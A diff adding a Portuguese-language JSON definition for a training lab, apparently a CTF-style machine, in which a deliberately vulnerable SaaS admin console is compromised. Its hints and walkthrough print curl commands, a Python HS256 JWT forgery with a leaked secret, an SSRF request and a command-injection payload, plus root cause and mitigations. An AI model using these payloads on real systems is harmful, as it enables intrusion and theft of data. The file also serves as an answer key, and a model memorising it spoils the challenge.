@@ -1,0 +1,100 @@
+{
+  "slug": "machine-saas-admin-console",
+  "title": "Orbit Console",
+  "codename": "ORBIT",
+  "summary": "Um console de admin de SaaS B2B publica seu bundle de docs de integração, que vaza um login de preview da equipe e o segredo de assinatura HS256. Use-o para se tornar administrador, exportar o faturamento dos tenants e então abusar do diagnóstico de webhook do admin para chegar a um shell de worker interno.",
+  "category": "chain",
+  "difficulty": "hard",
+  "kind": "machine",
+  "lab_dir": "machine-saas-admin-console",
+  "estimated_minutes": 55,
+  "xp": 420,
+  "tech": [
+    "Flask",
+    "JWT (HS256)",
+    "SSRF",
+    "Shell",
+    "Recon"
+  ],
+  "tags": [
+    "machine",
+    "recon",
+    "jwt-forgery",
+    "broken-function-level-authorization",
+    "ssrf",
+    "command-injection",
+    "chaining"
+  ],
+  "story": "A Orbit Cloud executa provisionamento de tenants e faturamento de assinaturas em um único console da equipe. Durante a migração de SSO, a Platform Engineering publicou uma cópia estática do bundle interno de docs no host público de docs e nunca rotacionou o segredo do preview token. O console confia na claim de role dentro do cookie `orbit_session`, e o fetcher de diagnóstico de webhook exclusivo de administrador consegue alcançar workers de entrega na interface loopback, onde um helper de healthcheck ainda passa o host para um shell.",
+  "objective": "Inicie uma sessão da equipe a partir do bundle público de docs para a flag de usuário, forje um token de administrador com o segredo de assinatura vazado para ler a exportação de faturamento para a flag de API, e então faça pivot pelo fetcher de diagnóstico do admin até o worker interno e execute um comando para a flag de root.",
+  "rules": "A origem loopback atribuída é todo o escopo do engajamento. Não escaneie outras portas. As flags são dinâmicas e verificadas por estado.",
+  "flags": [
+    {
+      "key": "user",
+      "label": "Flag do console da equipe",
+      "flag_type": "user",
+      "points": 80,
+      "required": true
+    },
+    {
+      "key": "api",
+      "label": "Flag da exportação de faturamento",
+      "flag_type": "api",
+      "points": 130,
+      "required": true
+    },
+    {
+      "key": "root",
+      "label": "Flag root do worker",
+      "flag_type": "root",
+      "points": 210,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "O host de docs lembra de tudo",
+      "body": "`/robots.txt` desautoriza `/onboarding/` e `/docs` aponta para o bundle. Leia `README.txt` e `/onboarding/preview.html`: as notas de preview contêm um login de bootstrap da equipe e o segredo de assinatura JWT do console. Entre em `/login` e abra `/console` para a flag de usuário.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "O cookie é a autorização",
+      "body": "Após o login, o console armazena um JWT no cookie `orbit_session`. Decodifique-o: `role` é `staff`. Reassine as claims com `role: admin` usando HS256 e o segredo vazado (`orbit-console-jwt-2025!`), depois chame `/api/admin/tenants/export` para a flag de API. `/console/export` explica o escopo pretendido.",
+      "cost": 30
+    },
+    {
+      "level": 3,
+      "title": "Sonde o caminho para dentro",
+      "body": "Com o cookie de admin forjado, abra `/console/admin/diagnostics`. A trigger URL é buscada do lado do servidor com o header interno de despacho. Busque `http://127.0.0.1:<port>/internal/worker/info` para descobrir o endpoint de healthcheck do worker, depois aponte para `/internal/worker/shell` com o campo opcional `probe` definido como `127.0.0.1; cat /tmp/orbit-root.txt`.",
+      "cost": 45
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Etapa 1 — recon até a sessão da equipe.** `GET /robots.txt` desautoriza `/onboarding/`. `GET /docs` retorna uma página `410` que ainda aponta para o bundle. `GET /onboarding/preview.html` renderiza as notas de build de preview (com escape HTML na página, então leia o código-fonte bruto) com `jwtSecret: \"orbit-console-jwt-2025!\"` e `window.OrbitConsole.previewWidget()` contendo `support.ops@orbit.internal` / `0rb1t-Staff!2025`. Entre:\n\n```bash\ncurl -i -c jar -d 'username=support.ops@orbit.internal&password=0rb1t-Staff!2025' http://127.0.0.1:PORT/login\ncurl -b jar http://127.0.0.1:PORT/console   # -> user flag\n```\n\n**Etapa 2 — forje a claim de administrador.** O console mantém o JWT em `orbit_session` e confia no `role` das claims. Qualquer um que tenha o segredo vazado pode emitir um token de admin (sessões `staff` recebem `403` na exportação):\n\n```bash\npython3 - <<'PY'\nimport base64,json,hmac,hashlib\nb=lambda d: base64.urlsafe_b64encode(d).rstrip(b'=').decode()\nh=b(json.dumps({'alg':'HS256','typ':'JWT'},separators=(',',':')).encode())\np=b(json.dumps({'sub':'m_support','email':'support.ops@orbit.internal','role':'admin','iss':'orbit-console'},separators=(',',':')).encode())\ns=b(hmac.new(b'orbit-console-jwt-2025!',f'{h}.{p}'.encode(),hashlib.sha256).digest())\nprint(f'{h}.{p}.{s}')\nPY\ncurl -H 'Cookie: orbit_session=<token>' http://127.0.0.1:PORT/api/admin/tenants/export\n```\n\nO JSON `finance_handoff.api_flag` é a flag de API e `/console/admin` agora está acessível.\n\n**Etapa 3 — SSRF para o worker, depois command injection.** `/console/admin/diagnostics` busca qualquer URL com `X-Orbit-Dispatch: <worker token>`. Primeiro sonde os metadados do worker, depois chame sua rota de healthcheck pelo mesmo fetcher com o campo opcional `probe`:\n\n```bash\ncurl -b 'orbit_session=<token>' -d 'url=http://127.0.0.1:PORT/internal/worker/info' http://127.0.0.1:PORT/console/admin/diagnostics\n# -> \"healthcheck\": \"/internal/worker/shell?host=<target>\"\ncurl -b 'orbit_session=<token>' \\\n  --data-urlencode 'url=http://127.0.0.1:PORT/internal/worker/shell' \\\n  --data-urlencode 'probe=127.0.0.1; cat /tmp/orbit-root.txt' \\\n  http://127.0.0.1:PORT/console/admin/diagnostics\n```\n\nO worker monta `/usr/bin/getent hosts <probe>` com `shell=True`; a saída do `cat` é retornada dentro da response do console e o objetivo é registrado.",
+    "root_cause": "Três falhas encadeiam. (1) Um bundle público de docs entregou um build interno com credenciais de preview e o segredo de assinatura HS256. (2) A API decide a autorização a partir de uma claim de JWT mantida pelo cliente e nunca verifica se o token foi emitido pelo console (o issuer de preview emite tokens com a mesma chave), então um segredo vazado equivale a account takeover total. (3) O fetcher de diagnóstico do administrador é um server-side request forgery sem restrições que anexa a identidade interna de despacho, e o healthcheck do worker interno passa o host para um comando de shell enquanto roda como uma service account privilegiada.",
+    "mitigation": "Remova credenciais e segredos de artefatos publicados e rotacione tudo que vazar. Emita tokens de curta duração com chaves separadas por issuer, imponha `iss`/`aud` e nunca confie em uma claim de role sem registros de sessão no servidor. Restrinja o fetcher de diagnóstico com uma allow-list de hostnames de worker e remova o header interno para destinos arbitrários. Sirva metadados de worker apenas na rede interna. Substitua a interpolação de shell por `subprocess.run([...], shell=False)` e validação de argumentos; rode workers sem acesso de leitura a segredos."
+  },
+  "references": [
+    {
+      "title": "OWASP API Security Top 10 2023 — A5: Broken Function Level Authorization",
+      "url": "https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/",
+      "source_type": "standard",
+      "description": "Por que as verificações de role precisam ser aplicadas no servidor, e não pela claim do cliente."
+    },
+    {
+      "title": "PortSwigger — JWT attacks",
+      "url": "https://portswigger.net/web-security/jwt",
+      "source_type": "official",
+      "description": "Forja com chave vazada e confiança nas claims do token."
+    },
+    {
+      "title": "PortSwigger — Server-side request forgery (SSRF)",
+      "url": "https://portswigger.net/web-security/ssrf",
+      "source_type": "official",
+      "description": "Alcançar serviços internos a partir de um fetcher do lado do servidor."
+    }
+  ]
+}
